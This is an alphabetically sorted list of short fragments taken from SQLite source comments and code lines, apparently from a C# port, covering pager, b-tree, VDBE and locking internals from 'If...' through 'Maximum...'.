 If the table has no indices and there are no terms in the where
 If the table is not located in the temp.db (in which case NULL is
 If the temp database has been explicitly named as part of the
 If the third parameter to sqlite3_result_error() or
 If the unsigned integer that zNum represents will fit in a
 If the user has not indicated to use localtime_r() or localtime_s()
 If the value in register P2 is zero the result is NULL.
 If the value n is out of range or if the n-th parameter is
 If the varint stored in p[0] is larger than can fit in a 32-bit unsigned
 If the virtual table pVtab supports the transaction interface
 If the where clause loops cannot be arranged to provide the correct
 If the xOpen method sets the sqlite3_file.pMethods element 
 If the zFilename parameter is xOpen is a NULL pointer then xOpen
 If there are active savepoints and any of them were created
 If there are different collating sequences or if the columns of
 If there are dirty pages in the page cache with page numbers greater
 If there are no outstanding cursors and we are not in the middle
 If there are still other outstanding references to the shared-btree
 If there are zero parameters (if even argv[0] is undefined)
 If there is a GROUP BY clause we might need a sorting index to
 If there is a chance that the b-tree might contain a NULL value at
 If there is a destructor routine associated with the token which
 If there is a reference to page 1 and the pgno parameter passed to this
 If there is already a lock of this type or more restrictive on the
 If there is no IDLIST term but the table has an integer primary
 If there is not already a read-only (or read-write) transaction opened
 If there is only a single implementation which does not care what text
 If there was an INDEXED BY clause (pSrc.pIndex) attached to the table in
 If these routines are called from within the different thread
 If this database supports auto-vacuum and iPage is not the last
 If this global variable is made to point to a string which is
 If this has to be a scalar SELECT.  Generate code to put the
 If this instruction implements a COMMIT and other VMs are writing
 If this instruction implements a ROLLBACK and other VMs are
 If this is a rollback of a savepoint and data was not written to
 If this is an optimized SELECT min(x).. 
 If this loop satisfies a sort order (pOrderBy) request that
 If this match occurs on a column that is in the USING clause
 If this maximum height is greater than the current value pointed
 If this playback is happening automatically as a result of an IO or
 If this routine fails for any reason (malloc returns NULL or unable
 If this statement is a [SELECT] statement and the Nth column of the
 If triggers are not suppored by this compile then the statement machine
 If two or more threads call one or more
 If two or more threads call one or more of these routines against the same
 If waiting for read-locks to clear 
 If we are not debugging and the reduce action popped at least
 If we are on an architecture with mixed-endian floating
 If we are rereading the sqlite_master table create the in-memory
 If we cannot open the rollback journal file in order to see if
 If we dynamically allocated space to hold the data (in the
 If writing to memory or generating a set
 If xOpen() opens a file read-only then it sets 
 If xRead() returns SQLITE_IOERR_SHORT_READ it must also fill
 If zFilename is NULL then a randomly-named temporary file is created
 If zVfsName is NULL then the default VFS is returned.
 Ignore :memory: databases 
 Ignore DESC 
 Ignore any IO error that occurs within pager_end_transaction(). The
 Ignore references to this table 
 Ignore schema errors 
 Ignore the TEMP database 
 Ignore the error. Do not do the INSERT or UPDATE 
 Ignore this whole file if pragmas are disabled
 Ignore trailing rowid on key1 
 Implement the main merge loop
 Implementation of random().  Return a random integer.
 Implementation of randomblob(N).  Return a random blob
 Implementation of the QUOTE() function.  This function takes a single
 Implementation of the VERSION(
 Implementation of the abs() function
 Implementation of the changes() SQL function.  The return value is the
 Implementation of the last_insert_rowid() SQL function.  The return
 Implementation of the length() function
 Implementation of the like() SQL function.  This function implements
 Implementation of the non-aggregate min() and max() functions
 Implementation of the round() function
 Implementation of the sqlite3_pcache.xCachesize method.
 Implementation of the sqlite3_pcache.xCreate method.
 Implementation of the sqlite3_pcache.xDestroy method.
 Implementation of the sqlite3_pcache.xFetch method. 
 Implementation of the sqlite3_pcache.xInit method.
 Implementation of the sqlite3_pcache.xPagecount method.
 Implementation of the sqlite3_pcache.xRekey method.
 Implementation of the sqlite3_pcache.xShutdown method.
 Implementation of the sqlite3_pcache.xTruncate method.
 Implementation of the sqlite3_pcache.xUnpin method.
 Implementation of the substr() function.
 Implementation of the total_changes() SQL function.  The return value is
 Implementation of the upper() and lower() SQL functions.
 Impossible to shift the $ token 
 In all cases new databases created using the ATTACH command are
 In case the blob is ever cast to text 
 In case the blob is ever converted to text 
 In either case leave an error message in pParse and return non-zero.
 In practice the KeyInfo structure will not be used. It is only
 In the example above nEq==2.  But this subroutine works for any value
 In the second form this pragma sets the text encoding to be used in
 In these cases return true immediately.  If the client is reading
 In this case set iRoot to the root page number of the index b-tree
 In this case the pcache already contains an initialized copy of
 In this case there is room on the trunk page to insert the page
 In this case we accept the default page size and delay actually
 In this mode (which is the default when SQLite is compiled with
 In-memory DB.  No argument 
 In-memory journal file 
 Include code that is common to all os_
 Include standard header files as necessary
 Include the configuration header output by 'configure' if we're using the
 Including a description of file format and an overview of operation.
 Increase pSpace by this much to 8-byte align it 
 Increase the reference count of a supplied page by 1.
 Increment Parse.nHeight by the height of the largest expression
 Increment the free page count on pPage1 
 Increment the nRef value on all name contexts from TopNC up to
 Increment the reference count for page pPg.
 Increment the reference count of an existing page 
 Increment the row change counter 
 Increment the row counter
 Increment the value just read and write it back to byte 24. 
 Incremental vacuum 
 Incremented with each busy call 
 Index Name      NULL            
 Index Name      Table Name      
 Index added to make the name unique 
 Index column i is the rowid.  All other terms match. 
 Index entries are allocated in large chunks (instances of the
 Index for FROM table at pTabItem 
 Index in aCell[] of cell after i-th page 
 Index in aData of first cell pou16er 
 Index in data[] where new cell pointer is inserted 
 Index in p.pSrc.a[] of the inner subquery 
 Index in pSrc.a[] of first new slot 
 Index in pTabList->a[] of table being read 
 Index in some Table.aCol[] of a column named zName 
 Index in sqlite3.aDb[] of database holding pTab 
 Index info for n-th source table 
 Index information passed to xBestIndex 
 Index into Parse.aAlias[] for zName 
 Index into header 
 Index into the cell pointer array 
 Index of NEW table for triggers.  -1 if none 
 Index of VdbeCursor for index being analyzed 
 Index of VdbeCursor that writes the sqlite_stat1 table 
 Index of a read/write cursor pointing at pTab 
 Index of cell to delete 
 Index of child node in parent 
 Index of column <column> 
 Index of column in pFrom 
 Index of column in pTab 
 Index of column zName applies to 
 Index of current cell in pPage 
 Index of current page in apPage 
 Index of cursor database in db.aDb[] (or -1) 
 Index of data_base containing table/index 
 Index of database containing pTab 
 Index of database holding TABLE 
 Index of first cell to the left of right sibling 
 Index of first record in sub-journal 
 Index of free page to move pLastPg to 
 Index of right-most cell in left sibling 
 Index of root page 
 Index of the OR-term to be analyzed 
 Index of the database containing the table to lock 
 Index of the database holding pTab 
 Index of the database that is being written 
 Index of the database to use 
 Index of the new VdbeCursor 
 Index of the parameter to bind 
 Index of the range of input registers 
 Index of the table column 
 Index of the term to be analyzed 
 Index of top element in stack 
 Index of top element in the context stack 
 Index of zColumn in row-record 
 Index pNext
 Index structure  
 Index when WHERE_INDEXED is true 
 Index.aSortOrder 
 Index.aiColumn   
 Index.aiRowEst   
 Index.azColl     
 Index.zName      
 Indicate that a register is being overwritten.  Purge the register
 Indicates a pending lock has been obtained 
 Indicates a reserved lock has been obtained 
 Indicates an exclusive lock has been obtained 
 Indices can only be used if all ORDER BY terms past the
 Individual characters in zCharSet 
 Inequality constraint at range end 
 Inequality constraint at range start 
 Info about index keys needed by index cursors 
 Info for single OR-term scan 
 Information about AUTOINCREMENT counters 
 Information about aggregates at this level 
 Information about an AUTOINCREMENT 
 Information about each column 
 Information about each format field 
 Information about each nest loop in the WHERE 
 Information about each nested IN operator 
 Information about how to do the compare 
 Information about the ORDER BY clause is stored in aOrderBy[].
 Information about the WHERE clause 
 Information about the function 
 Information about the record format 
 Information that depends on plan.wsFlags 
 Information used by aggregate queries 
 Information used during initialization 
 Initial number of leaf cells on trunk page 
 Initial number of pages on free-list 
 Initial static space for a[] 
 Initial value of change-counter field 
 Initialise vdbe cursor object 
 Initialization context 
 Initialize SQLite.
 Initialize a DbFixer structure.  This routine must be called prior
 Initialize a SelectDest structure.
 Initialize a preallocated WhereClause structure.
 Initialize a string accumulator
 Initialize an expression mask set (a WhereMaskSet object)
 Initialize and deinitialize the mutex subsystem.
 Initialize and deinitialize the operating system interface.
 Initialize and shutdown the page cache subsystem 
 Initialize and shutdown the page cache subsystem. Neither of these
 Initialize any AUTOINCREMENT data structures required.
 Initialize memory locations used by GROUP BY aggregate processing
 Initialize sqlite3_vtab_cursor base class 
 Initialize the PCache object. 
 Initialize the VDBE program 
 Initialize the auxiliary information for a disk block.
 Initialize the count of rows to be inserted
 Initialize the count of updated rows
 Initialize the local lockdata 
 Initialize the malloc() system and the recursive pInitMutex mutex.
 Initialize the memory allocation subsystem.
 Initialize the memory allocator 
 Initialize the mutex system.
 Initialize the name-context 
 Initialize the node to no-match 
 Initialize the rowset register to contain NULL. An SQL NULL is
 Initialize the shared memory if we're supposed to 
 Initialize the structure.  The sqlite3_index_info structure contains
 Initialize this module.
 Initialize zType for the new view or table.
 Initializing the tail of the buffer is not necessary.  Everything
 Input iterator 
 Input string 
 Inputs 
 Inputs:
 Insert a new FuncDef into a FuncDefHash hash table.
 Insert a new value into a RowSet.
 Insert code to test every subexpression that can be completely
 Insert data into the table of this cursor 
 Insert divider cells into pParent as necessary.
 Insert rowid into rowset
 Insert the cookie verifier Goto 
 Insert the integer value held by register P2 into a boolean index
 Insert the new divider cell into pParent. 
 Insert this cell before idx-th non-overflow cell 
 Insertion failed because database is full 
 Instances of struct TriggerStep are stored in a singly linked list (linked
 Instruction opcode 
 Instruction to jump to for RAISE(IGNORE) 
 Integer 0 
 Integer 1 
 Integer and Real 
 Integer key for tables.  Size of pKey for indices 
 Integer primary key is autoincrement 
 Integer return code 
 Integer sum 
 Integer value 
 Integer value contained in u.iTable 
 Integer value if EP_IntValue 
 Integer value if p4type==P4_INT32 
 Integer value of left operand 
 Integer value of right operand 
 Integer value. 
 Integers of known sizes.  These typedefs might change for architectures
 Integrity check context 
 Integrity checking context 
 Interchange pMem1 and pMem2 if the collating sequence specifies
 Interface to the testing logic.
 Internal function prototypes
 Internal interface definitions for SQLite.
 Internal logic error in SQLite 
 Interpret the [database.] part of the pragma statement. iDb is the
 Interpret the content of register P1 as an integer.  Store the
 Interpret the data that cursor P1 points to as a structure built using
 Interpret the given string as a boolean value.
 Interpret the given string as a locking mode value.
 Interpret the given string as a temp db location. Return 1 for file
 Interpret the given string as an auto-vacuum mode value.
 Interpret the value in register P1 as a boolean value.  Store the
 Invalidate all ephemeral cursor row caches 
 Invalidate all incrblob cursors open on table iTable (assuming iTable
 Invalidate all prepared statements whenever the TEMP database
 Invalidate any prior representations.
 Invalidate the overflow page-list cache for all cursors opened
 Invoke a user function (P4 is a pointer to a Function structure that
 Invoke a virtual table constructor (either xCreate or xConnect). The
 Invoke any destructors registered for collation sequence user data. 
 Invoke sqlite3WalkSelect() for subqueries in the FROM clause and
 Invoke th  /
 Invoke the 'collation needed' callback to request a collation sequence
 Invoke the OP_AggFinalize opcode for every aggregate function
 Invoke the authorization callback. 
 Invoke the busy handler for a btree.
 Invoke the callback function if required 
 Invoke the callback once if the 
 Invoke the coroutine to extract information from the SELECT
 Invoke the given busy handler.
 Invoke the profile callback if there is one
 Invoke the update-hook if required. 
 Invoke the virtual table constructor 
 Invoke the xBegin method 
 Invoke the xCommit method of all virtual tables in the 
 Invoke the xFileControl method on a particular database.
 Invoke the xNext() method of the module. There is no way for the
 Invoke the xRollback method of all virtual tables in the 
 Invoke the xSync method of all virtual tables in the sqlite3.aVTrans
 Invoke this callback routine 
 Invoked at every commit. 
 Invokes xBusyHandler
 Is a virtual table 
 Is equivalent to
 Is equivalent to:
 Is is misuse to call this routine with statements from different
 Is it necessary
 IsVirtual( pTab ) )
 IsVirtual( pTab ) == false )
 IsVirtual( pTabList.a[i].pTab ) )
 IsVirtual(pTab) ){
 It also clears MEM_Ephem and MEM_Static. If the preserve flag is
 It checks that the primitives for serializing and deserializing
 It could be argued that the intptr_t type could be used in this
 It determines whether or not the features related to
 It immediately generates code to store the value in a memory location.
 It is <i>not</i> used to indicate the file should be opened 
 It is an error for P1 to be negative.
 It is an error to call this function if the page is already
 It is assumed that the mutex associated with the BtShared object
 It is assumed that the page is not already a part of the free-list.
 It is assumed that the sqlite3BtreeCursorSize() bytes of memory
 It is illegal to call sqlite3PagerAcquire() until after this function
 It is illegal to drop a table if any cursors are open on the
 It is illegal to use this instruction on a register that does
 It is important that all schema cookies be verified and all
 It is included here only so that that compiler will know how big it
 It is intended that this variable be set once
 It is just copied onto the P2 register exactly as
 It is much less likely that the two ends of the journal record will be
 It is not possible for a call to PcacheFetch() with createFlag==0 to
 It is not possible for this routine to fail if the second argument
 It is not possible to create a database for which the final page
 It is not possible to lower the locking level one step at a time.  You
 It is not possible to release (commit) a savepoint if there are
 It is not safe to pass a result table directly to [sqlite3_free()].
 It is not safe to read or modify this variable in more than one
 It is permitted to register multiple implementations of the same
 It is recommended that when a database filename actually does begin with
 It is reported that an attempt to close a handle might sometimes
 It is safe to call this routine from a thread different from the
 It is the callers responsibility to use subjRequiresPage() to check
 It makes more sense to use 0.5 
 It merely means that we might do some extra work to journal a
 It merely prevents new constructs that exceed the limit
 It might just as well be a procedure (returning void) but we continue
 It must be the case that N is sufficient to make a Rowset.  If not
 It performs a single unit of work towards an incremental vacuum.
 It used to be the case that setting this value to zero would
 It uses the RDTSC opcode to read the cycle count value out of the
 It's job is to find or create a b-tree structure that may be used
 Iterate through all dirty pages currently stored in the cache. This
 Iterator for looping through Pager.aSavepoint 
 Iterator variable 
 JOIN 
 JOURNAL_CHUNKSIZE ) <= iOfst 
 JOURNAL_HDR_SZ( pPager ) == pPager.journalOff
 JOURNAL_HDR_SZ( pPager ) == pPager.journalOff )
 JOURNAL_HDR_SZ( pPager ) > journalSize )
 JOURNAL_HDR_SZ(pPager)
 JOURNAL_PG_SZ(pPager)
 JT_CROSS ) ) != 0 
 JT_ERROR ) != 0
 JT_LEFT ) != 0 )
 JT_LEFT ) != 0 )// Check value of pTabItem[0].jointype
 JT_NATURAL ) != 0 
 JT_NATURAL ) != 0 )
 JT_NATURAL ) != 0 )// pItem[1].jointype
 JT_OUTER ) 
 JT_OUTER ) != 0
 JT_OUTER ) != 0 )
 JT_OUTER ) ) == ( JT_INNER 
 JT_RIGHT ) ) != JT_LEFT )
 Join two expressions using an AND operator.  If either expression is
 Join type mask 
 Journal file must be open. 
 Journal files begin with the following magic string.  The data
 Journal omitted.  
 Julian day number
 Jump back and run the AFTER triggers 
 Jump back and run the BEFORE triggers 
 Jump back to the Gosub
 Jump back to this point if a trigger encounters an IGNORE constraint. 
 Jump here for an error that occurs after successfully allocating
 Jump here for next cycle 
 Jump here if database corruption is detected after m has been
 Jump here if malloc fails 
 Jump here if true.  
 Jump here if we hit the LIMIT 
 Jump here to break out of the inner loop 
 Jump here to break out of the loop 
 Jump here to continue with next cycle 
 Jump here to continue with next record 
 Jump here to continue with next row 
 Jump here to continue with the next loop cycle 
 Jump here to exit loop 
 Jump here to skip the current record 
 Jump here to skip this query
 Jump here to start the next IN combination 
 Jump instructions that get retargetted 
 Jump over the subroutines
 Jump past the various subroutines and coroutines to the main
 Jump to P2 if the value in register P1 is False.  The value is
 Jump to P2 if the value in register P1 is NULL.
 Jump to P2 if the value in register P1 is not NULL.
 Jump to P2 if the value in register P1 is true.  The value is
 Jump to cont to go immediately to the next iteration of the
 Jump to here for an SQLITE_MISUSE error.
 Jump to here if a malloc() fails.
 Jump to here if a string or blob larger than db.aLimit[SQLITE_LIMIT_LENGTH]
 Jump to here if not distinct 
 Jump to here if the sqlite3_interrupt() API sets the interrupt
 Jump to the end of the loop if the LIMIT is reached.
 Jump to the next instruction after the address in register P1.
 Jump to the this point in order to terminate the query.
 Jump to this label on an OE_Ignore resolution 
 Justification of ALWAYS()
 Justification of ALWAYS():  A correct vtab constructor must allocate
 Justification of ALWAYS():  The xConstructor method is required to
 Justification of the ALWAYS(pListItem->pExpr->pColl):  Because of
 KEY 
 KEY:
 KEYWORDS: SQLITE_OK {error code} {error codes}
 KEYWORDS: SQLITE_TEXT
 KEYWORDS: sqlite3_index_info
 KEYWORDS: sqlite3_module {virtual table module}
 KEYWORDS: sqlite3_version
 KEYWORDS: sqlite3_vtab
 KEYWORDS: sqlite3_vtab_cursor {virtual table cursor}
 KEYWORDS: sqlite_int64 sqlite_uint64
 KEYWORDS: {BLOB handle} {BLOB handles}
 KEYWORDS: {SQL parameter} {SQL parameters} {parameter binding}
 KEYWORDS: {SQL statement compiler}
 KEYWORDS: {application-defined SQL functions}
 KEYWORDS: {application-defined SQL function}
 KEYWORDS: {autocommit mode}
 KEYWORDS: {column access functions}
 KEYWORDS: {database connection} {database connections}
 KEYWORDS: {extended error code} {extended error codes}
 KEYWORDS: {extended result code} {extended result codes}
 KEYWORDS: {function creation routines}
 KEYWORDS: {host parameter} {host parameters} {host parameter name}
 KEYWORDS: {limit category} {limit categories}
 KEYWORDS: {prepared statement} {prepared statements}
 KEYWORDS: {protected sqlite3_value} {unprotected sqlite3_value}
 KEYWORDS: {result code} {result codes}
 KEYWORDS: {shared cache}
 Key associated with this element 
 Key for the NEW or OLD pseudo-table row 
 Key information for an index 
 Key value (page number) 
 Key(0) 
 Key(1) 
 Key(N-1) 
 Key1 and Key2 do not have to contain the same number of fields.
 KeyInfo for index 
 KeyInfo structure is appropriate for initializing a virtual index to
 KeySize() cannot fail 
 Keyinfo for scanned index 
 Keying information for the group by clause 
 Keywords and unquoted identifiers 
 LALR(1) grammar but which are always false in the
 LEFT 
 LIKE 
 LIKE on all candidate expressions by clearing the isComplete flag
 LIMIT 
 LIMIT clause of a SELECT statement.
 LIMIT expression. NULL means not used. 
 LIMIT has been implemented by the pushOntoSorter() routine.
 LIMIT value.  NULL means not used 
 LRU list of unused clean pgs 
 Label for the end of the insertion loop 
 Label for the end of the overall SELECT stmt 
 Label for the start of the merge algorithm 
 Large file support can be disabled using the -DSQLITE_DISABLE_LFS switch
 Largest key seen since xTruncate() 
 Largest permissible value of i 
 Largest possible freeblock offset 
 Last character before the first wildcard 
 Last element in link-list. Valid for 1st elem only 
 Last entry on the pEntry list 
 Last field of the record 
 Last insert rowid (sqlite3.lastRowid) 
 Last possible cell index 
 Last possible cell or freeblock offset 
 Last register to which to apply affinity 
 Last rowid from a Next or NextIdx operation 
 Last statement is orphaned TEMP trigger 
 Last synced page in dirty page list 
 Last zStr[] that might match zPattern[] 
 LastError 
 Later we learn that _XOPEN_SOURCE is poorly or incorrectly
 Leading zeros are ignored.
 Least recently used entry has the smallest value 
 Leave STATIC_MASTER mutex 
 Leave rc unchanged at 0 
 Leave rc==0 
 Leave the mutex of every btree in the group.
 Left key 
 Left operand 
 Left outer join 
 Left subnode 
 Left subtree 
 Left subtree (smaller entries) 
 Left table being joined 
 Left-most of SELECT of a compound 
 Length in bytes of master journal name 
 Length of a field 
 Length of each character in zCharSet 
 Length of string z 
 Length of string zMaster 
 Length of the field 
 Length of the function name in bytes 
 Length of the keyword in characters 
 Length of the string so far 
 Length of zSql in bytes. 
 Let V[] be an array of unsigned characters sufficient to hold
 Let X be the first thread to enter this routine.  Let Y be some other
 Library used incorrectly 
 Like free() but works for allocations obtained from sqlite3MemMalloc()
 Like realloc().  Resize an allocation previously obtained from
 Limit ) return ( a.Length - Offset < b.Length ) 
 Limit register for select-A 
 Limit the length of the LIKE or GLOB pattern to avoid problems
 Limit the precision to prevent overflowing buf[] during conversion 
 Limits 
 Limits in SQLite].
 Link list of trigger program steps             
 Link pNew element into the hash table pH.  If pEntry!=0 then also
 Link the foreign key to the table as the last step.
 Link the new Index structure to its table and to the other
 Link the new savepoint into the database handle's list. 
 Linked List Management 
 Linked list of VDBEs with the same Vdbe.db 
 Linked list of all foreign keys in this table 
 List of SQL indexes on this table. 
 List of SQL triggers on this table 
 List of Table objects to delete after code gen 
 List of VTable objects. 
 List of WHEN terms 
 List of active savepoints 
 List of active virtual machines 
 List of all chunk allocations 
 List of available buffers 
 List of columns 
 List of columns in pTableName to insert into 
 List of columns to extract. 
 List of dirty pages in LRU order 
 List of entries using pRight 
 List of expressions to scan 
 List of field names to be indexed 
 List of function arguments 
 List of locks held on this shared-btree struct 
 List of operands to the LIKE operator 
 List of other sharable Btrees from the same db 
 List of statements inside the trigger body 
 List of tables 
 List of tables in the join 
 List of tables to select from 
 List of triggers on table pTab 
 List of triggers to return 
 List of values being extracted 
 List of values to be inserted 
 List to scan and in which to make substitutes 
 List to which to add the span. 
 List to which to append. Might be NULL 
 Load all automatic extensions.
 Load automatic extensions - extensions that have been registered
 Load new statistics out of the sqlite_stat1 table 
 Load pointers to all cells on sibling pages and the divider cells
 Load the content of the sqlite_stat1 table into the index hash tables.
 Load the entire master journal file into space obtained from
 Load the extension into this database connection 
 Load the value for the inequality constraint at the end of the
 Local cache of jsl 
 Local cache of pPage.aData 
 Local cache of pPage.hdrOffset 
 Local cache of vfs pointer 
 Local reference to page 1 
 Local size of all cells in apCell[] 
 Locate and return an entry from the db.aCollSeq hash table. If the entry
 Locate or create an AutoincInfo structure associated with table pTab
 Locate the end of the CREATE VIEW statement.  Make sEnd point to
 Locate the in-memory structure that describes
 Locate the in-memory structure that describes a particular database
 Locate the required virtual table module 
 Locate the table in question 
 Locate the table into which we will be inserting new information.
 Locate the table which we want to delete.  This table has to be
 Locate the table which we want to update.
 Location in parent of right-sibling pointer 
 Lock all btrees used by the statement 
 Lock the PENDING_LOCK byte if we need to acquire a PENDING lock or
 Lock the file with the lock specified by parameter locktype - one
 Lock the source database handle. The destination database
 Lock the virtual table so that it cannot be disconnected.
 LockFile() prevents not just writing but also reading by other processes.
 Locks are added (or upgraded from READ_LOCK to WRITE_LOCK) when a cursor 
 Locks nest.  Every lock should have a corresponding unlock.
 Locks obtained by this instance of sqlite3_file 
 Look at each index.
 Look for range constraints.  Assume that each range constraint
 Look up every table named in the FROM clause of the select.  If
 Look up the table being altered. 
 Lookaside allocations are only allowed for objects that are associated
 Lookaside malloc configuration 
 Lookaside malloc is a set of fixed-size buffers that can be used
 Loop addresses 
 Loop counter 
 Loop counters 
 Loop over every record that needs updating.  We have to load
 Loop termination flag 
 Loop through each expression in <exprlist>. 
 Loop through table entries that match term pOrTerm. 
 Loop through the elements that will make up the record to figure
 Loop through the program looking for P2 values that are negative
 Lord Graeber. Thus we do not implement them. 
 Low-level memory allocation interface 
 Low-level mutex interface 
 Low-level page-cache interface 
 Lower the locking level on file descriptor id to locktype.  locktype
 Lowest cost query plan 
 MATCH 
 MEM_Agg ) != 0 )
 MEM_Agg ) ) == 0 )
 MEM_Agg ) == 0 )
 MEM_Blob 
 MEM_Blob ) != 0 
 MEM_Blob ) != 0 )
 MEM_Blob ) ) != 0 
 MEM_Blob ) ) != 0 )
 MEM_Blob ) ) != 0 ) // TODO -- 
 MEM_Blob ) ) == 0 )
 MEM_Blob ) ) == 0 ) 
 MEM_Blob ) == 0 )
 MEM_Blob ) >> 3 )
 MEM_Blob : MEM_Str )
 MEM_Blob) != 0)
 MEM_Dyn
 MEM_Dyn 
 MEM_Dyn )
 MEM_Dyn ) 
 MEM_Dyn ) != 0 
 MEM_Dyn ) != 0 )
 MEM_Dyn ) ) != 0 )
 MEM_Dyn ) ) == 0 )
 MEM_Dyn ) == 0 )
 MEM_Dyn)!=0 
 MEM_Ephem
 MEM_Ephem 
 MEM_Ephem ) != 0 
 MEM_Ephem ) != 0 )
 MEM_Ephem ) )
 MEM_Ephem ) ) == 0 )
 MEM_Ephem)!=0 
 MEM_Int 
 MEM_Int ) != 0 )
 MEM_Int ) )
 MEM_Int ) ) != 0 )
 MEM_Int ) ) == 0 )
 MEM_Int ) == 0 )
 MEM_Int ) == MEM_Int )
 MEM_Int if we can.
 MEM_Null )
 MEM_Null ) != 0 
 MEM_Null ) != 0 )
 MEM_Null ) != 0 ) break
 MEM_Null ) != 0 ) goto arithmetic_result_is_null
 MEM_Null ) ) == 0 )
 MEM_Null ) - ( f1 
 MEM_Null ) == 0 )
 MEM_Null ) == 0 ) break
 MEM_Null : MEM_Real )
 MEM_Real 
 MEM_Real ) != 0 )
 MEM_Real ) ) != 0 )
 MEM_Real ) ) == 0 )
 MEM_Real ) == 0 )
 MEM_RowSet ) != 0 )
 MEM_RowSet ) ) != 0 )
 MEM_RowSet ) == 0
 MEM_RowSet ) == 0 )
 MEM_RowSet ) == 0 ) goto no_mem
 MEM_RowSet ){
 MEM_Static 
 MEM_Static )
 MEM_Static ) != 0 )
 MEM_Static ) )
 MEM_Static ) ) != 0 )
 MEM_Static : MEM_Dyn )
 MEM_Static)!=0 
 MEM_Str 
 MEM_Str )
 MEM_Str ) 
 MEM_Str ) != 0
 MEM_Str ) != 0 )
 MEM_Str ) != 0 ) 
 MEM_Str ) != 0 /
 MEM_Str ) )
 MEM_Str ) ) != 0 )
 MEM_Str ) ) == ( MEM_Blob 
 MEM_Str ) ) == ( MEM_Int 
 MEM_Str ) ) == 0 
 MEM_Str ) == 0 
 MEM_Str ) == 0 )
 MEM_Str)!=0 
 MEM_Term
 MEM_Term ) != 0 
 MEM_Term ) != 0 )
 MEM_Term ) )
 MEM_Term)!=0 
 MEM_Zero
 MEM_Zero ) 
 MEM_Zero ) != 0 
 MEM_Zero ) != 0 )
 MEM_Zero ) != 0 ) sqlite3VdbeMemExpandBlob( P )
 MEM_Zero ) != 0 ) sqlite3VdbeMemExpandBlob( pVal )
 MEM_Zero ) )
 MEM_Zero ) == 0 )
 MEM_Zero)!=0)
 MJ checksum value read from journal 
 MX_CELL(pPage.pBt) <= 5460)
 MX_CELL_SIZE(pBt) bytes.
 Macro to find the minimum of two numeric values.
 Macros for looping over all elements of a hash table.  The idiom is
 Macros for performance tracing.  Normally turned off.  Only works
 Macros for troubleshooting.  Normally turned off
 Macros to determine the number of bytes required by a normal Expr
 Macros to enter and leave the global LRU mutex.
 Macros used to determine whether or not to use threads.
 Magic number for detect library misuse 
 Magic number for sanity checking 
 Main database structure 
 Main database when opening aux otherwise 0 
 Main file for the SQLite library.  The routines in this file
 Make a copy of a string in memory obtained from sqliteMalloc(). These
 Make a copy of register P1 into register P2.
 Make a copy of the entire SELECT statement that defines the view.
 Make a full copy of pFrom into pTo.  Prior contents of pTo are
 Make a hard copy of every element 
 Make a shallow copy of register P1 into register P2.
 Make additional entries to the pParse.aAgg[] array as necessary.
 Make an entry for the column in pAggInfo.aCol[] if there
 Make an entry in the sqlite_master table 
 Make an shallow copy of pFrom into pTo.  Prior contents of
 Make cursor iCur point to the record that is being updated.
 Make every page in the cache clean.
 Make nMaxCells a multiple of 4 in order to preserve 8-byte
 Make no changes but still report the old value if the
 Make no changes if X==0.  Return the value of the pending byte
 Make no changes if mxPage is zero or negative.  And never reduce the
 Make pExpr point to the appropriate pAggInfo.aFunc[] entry
 Make sure a corrupt database has not given us an oversize header.
 Make sure a mutex is held on the table to be accessed 
 Make sure all SELECTs in the statement have the same number of elements
 Make sure all objects are contained in this database 
 Make sure all the indices are constructed correctly.
 Make sure all writes to a particular file are committed to disk.
 Make sure cursor numbers have been assigned to all entries in
 Make sure every page in the file is referenced
 Make sure initialized even if FullPathname() fails 
 Make sure pBt.pTmpSpace points to an allocation of
 Make sure pMem.z points to a writable allocation of at least
 Make sure page is marked dirty 
 Make sure sufficient number of registers have been allocated 
 Make sure the BtCursor
 Make sure the INTERFACE macro is defined.
 Make sure the TEMP database is open and available for use.  Return
 Make sure the cursor p is ready to read or write the row to which it
 Make sure the given Mem is 
 Make sure the hard limits are set to reasonable values
 Make sure the locking sequence is correct
 Make sure the mutex subsystem is initialized.  If unable to
 Make sure the new table name does not collide with an existing
 Make sure the number of columns in the source data matches the number
 Make sure the ordering.. 
 Make sure the output register has a buffer large enough to store
 Make sure the pDone bit corresponding to the 
 Make sure the results of the current row are 
 Make sure there is enough space in p.azResult to hold everything
 Make sure there is no ORDER BY or LIMIT clause on prior SELECTs.  Only
 Make sure this analysis did not leave any unref() pages.
 Make sure this is not an attempt to ALTER a view. 
 Make sure virtual table pTab is contained in the pParse->apVirtualLock[]
 Make sure we can call this stuff from C
 Make this EXPR node point to the selected column 
 Make this key an epsilon larger 
 Make yytestcase() the same as testcase()
 MakeRecord instructions.  This opcode writes that key
 MakeRecord with this affinity for SRT_Set 
 Malloc failed 
 Malloc function used by SQLite to obtain space from the buffer configured
 Malloc function used within this file to allocate space from the buffer
 Malloc must have failed 
 Malloc must have failed inside HashInsert() 
 Malloc'd child-journal file descriptor 
 Malloc'd master-journal file descriptor 
 Malloced string that needs to be freed 
 Many SQLite functions return an integer result code from the set shown
 Many compilers we encounter do not define constants for the
 Many of the flag-pragmas modify the code generated by the SQL
 Many people are failing to set -DNDEBUG=1 when compiling SQLite.
 Mapping from ORDER BY terms to result set columns 
 Mapping from columns of pTab to entries in pChanges 
 Mapping from table cursor numbers to bitmaps 
 Mapping from table cursor numbers to bitmasks 
 Mapping from table cursors to bitmaps 
 Mapping from tables to bitmaps 
 Mapping of columns in pFrom to columns in zTo 
 Mapping of table cursor numbers to bitmasks 
 Mark a data page as writeable. This routine must be called before
 Mark a page as unpinned (eligible for asynchronous recycling).
 Mark a single data page as writeable. The page is written into the
 Mark a single page as clean 
 Mark all dirty list pages as clean 
 Mark every prepared statement associated with a database connection
 Mark the page as clean. 
 Mark the page as dirty.  If the page has already been written
 Mark them this way to avoid generated unneeded OP_SCopy
 Mask for page offset 
 Mask for the db.flags value 
 Mask of NEW.
 Mask of OLD.
 Mask of TF_
 Mask of WO_xx values describing operator 
 Mask of all non-compound WO_
 Mask of all possible WO_
 Mask of cursors that are not available 
 Mask of function arguments that are constant 
 Mask of trigger times 
 Mask of type bits 
 Mask of valid equality operators 
 Match terms of the ORDER BY clause against columns of
 Max iDivisor is max(u32) / BITVEC_NPTR 
 Max length of an SQL string 
 Max rowid register 
 Maximum allowed size of the database 
 Maximum allowed string length 
 Maximum allowed string or blob size 
 Maximum amount of payload held locally 
 Maximum depth of an SQLite B-Tree structure. Any B-Tree deeper than
 Maximum file pathname length 
 Maximum length (in bytes) of the pattern in a LIKE or GLOB
 Maximum length of output string in bytes 
 Maximum length of zSql in bytes. 
 Maximum local payload in a LEAFDATA table 
 Maximum local payload in non-LEAFDATA tables 
